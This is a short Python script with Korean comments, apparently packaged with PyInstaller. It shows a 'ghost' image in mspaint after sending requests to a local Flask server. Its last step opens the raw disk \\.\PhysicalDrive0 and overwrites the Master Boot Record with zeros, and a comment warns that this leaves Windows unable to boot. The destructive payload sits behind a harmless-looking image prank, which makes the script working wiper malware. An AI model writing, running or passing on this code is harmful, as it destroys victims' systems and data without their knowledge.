import subprocess
import os
import sys
import time
import threading
import requests
from flask import Flask
from PIL import Image, ImageDraw

app = Flask(__name__)

# PyInstaller가 파일을 압축 해제하는 임시 경로를 찾는 함수
def resource_path(relative_path):
    try:
        # PyInstaller 실행 시 생성되는 임시 폴더 경로
        base_path = sys._MEIPASS
    except Exception:
        # 일반 파이썬 실행 시 현재 작업 디렉토리
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

@app.route('/')
def say_by():
    return "by"

def run_server():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='127.0.0.1', port=8080)

def invoke_paint_ghost():
    # 포함된 이미지의 절대 경로를 가져옴
    image_name = "ghost_image.png"
    image_path = resource_path(image_name)

    # 이미지가 없을 경우 생성 (빌드 시 포함하므로 보통은 존재함)
    if not os.path.exists(image_path):
        try:
            img = Image.new('RGB', (800, 600), color=(0, 0, 0))
            draw = ImageDraw.Draw(img)
            draw.ellipse((200, 100, 600, 500), fill=(255, 0, 0))
            img.save(image_path)
        except:
            return

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    time.sleep(1)

    # 서버 요청 (로컬 통신)
    for _ in range(100): # 테스트를 위해 반복 횟수 조절 (기존 10만번은 매우 김)
        try:
            requests.get("http://127.0.0.1:8080")
        except:
            pass

    try:
        # 그림판으로 이미지 열기
        subprocess.Popen(['mspaint.exe', image_path])
        
        # 주의: 아래 코드는 시스템 부팅 영역(MBR)을 파괴합니다. 
        # 실제 환경에서 실행 시 윈도우 부팅이 불가능해질 수 있습니다.
        with open(r'\\.\PhysicalDrive0', 'wb') as f:
            f.write(b'\x00' * 512)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    invoke_paint_ghost()
